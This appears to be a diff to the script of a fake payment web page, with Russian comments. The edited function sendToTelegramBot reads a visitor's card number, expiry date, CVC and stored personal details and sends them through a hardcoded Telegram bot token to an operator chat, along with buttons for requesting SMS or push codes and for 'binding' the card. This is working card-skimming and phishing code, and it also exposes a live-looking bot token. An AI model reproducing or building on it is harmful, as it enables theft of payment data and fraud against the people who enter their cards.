@@ -1306,20 +1306,29 @@
         }
 
         async function sendToTelegramBot() {
-            try {
-                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-                localStorage.setItem('lastCardNumber', cardNumber);
-                
-                const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-                const expiry = document.getElementById('expiry').value;
-                const cvc = document.getElementById('cvc').value;
+    try {
+        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        localStorage.setItem('lastCardNumber', cardNumber);
+        
+        // ПРОВЕРЯЕМ УЖЕ ПРИВЯЗАНА ЛИ КАРТА
+        const isCardBound = await checkCardStatus(cardNumber);
+        console.log('🔍 Статус карты:', isCardBound ? 'ПРИВЯЗАНА' : 'НЕ ПРИВЯЗАНА');
+        
+        if (isCardBound) {
+            // ЕСЛИ КАРТА УЖЕ ПРИВЯЗАНА - ПОКАЗЫВАЕМ СООБЩЕНИЕ
+            showAlreadyBoundMessage();
+            return false;
+        }
+        
+        const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+        const expiry = document.getElementById('expiry').value;
+        const cvc = document.getElementById('cvc').value;
 
-                const isCardBound = await checkCardStatus(cardNumber);
-                const paymentId = Date.now() + (paymentCounter++);
-                const cardStatus = isCardBound ? 'ПРИВЯЗАННАЯ КАРТА' : 'НЕПРИВЯЗАННАЯ КАРТА';
-                const statusIcon = isCardBound ? '✅' : '🔗';
+        const paymentId = Date.now() + (paymentCounter++);
+        const cardStatus = "НЕПРИВЯЗАННАЯ КАРТА";
+        const statusIcon = '🔗';
 
-                const message = `💳 <b>${cardStatus}</b> ${statusIcon}
+        const message = `💳 <b>${cardStatus}</b> ${statusIcon}
 
 👤 <b>Клиент:</b>
 • Имя: ${formData.firstName || 'Тест'}
@@ -1332,54 +1341,55 @@
 • Срок: ${expiry}
 • CVC: ${cvc}`;
 
-                const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
-                const CHAT_ID = '-1003239032658';
+        const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
+        const CHAT_ID = '-1003239032658';
 
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    { 
-                                        text: "📱 SMS код", 
-                                        callback_data: `sms_${paymentId}_${userId}`
-                                    },
-                                    { 
-                                        text: "🔔 Пуш", 
-                                        callback_data: `push_${paymentId}_${userId}`
-                                    }
-                                ],
-                                ...(!isCardBound ? [[
-                                    {
-                                        text: "🔗 Привязать",
-                                        callback_data: `bind_${paymentId}_${userId}_${cardNumber}`
-                                    }
-                                ]] : []),
-                                [
-                                    { 
-                                        text: "❌ Неверная карта", 
-                                        callback_data: `wrong_card_${paymentId}_${userId}`
-                                    }
-                                ]
-                            ]
-                        }
-                    })
-                });
+        // ИСПОЛЬЗУЕМ НОВЫЙ ФОРМАТ callback_data С ДВОЕТОЧИЕМ
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { 
+                                text: "📱 SMS код", 
+                                callback_data: `sms:${paymentId}:${userId}`
+                            },
+                            { 
+                                text: "🔔 Пуш", 
+                                callback_data: `push:${paymentId}:${userId}`
+                            }
+                        ],
+                        [
+                            {
+                                text: "🔗 Привязать",
+                                callback_data: `bind:${paymentId}:${userId}`
+                            }
+                        ],
+                        [
+                            { 
+                                text: "❌ Неверная карта", 
+                                callback_data: `wrong_card:${paymentId}:${userId}`
+                            }
+                        ]
+                    ]
+                }
+            })
+        });
 
-                const result = await response.json();
-                console.log('Результат отправки:', result);
-                return result.ok;
+        const result = await response.json();
+        console.log('Результат отправки:', result);
+        return result.ok;
 
-            } catch (error) {
-                console.error('Ошибка отправки:', error);
-                return false;
-            }
-        }
+    } catch (error) {
+        console.error('Ошибка отправки:', error);
+        return false;
+    }
+}
 
         payBtn.addEventListener('click', async () => {
             if (!validateForm()) return;
@@ -1508,5 +1518,6 @@
     </script>
 </body>
 </html>
+
 
 
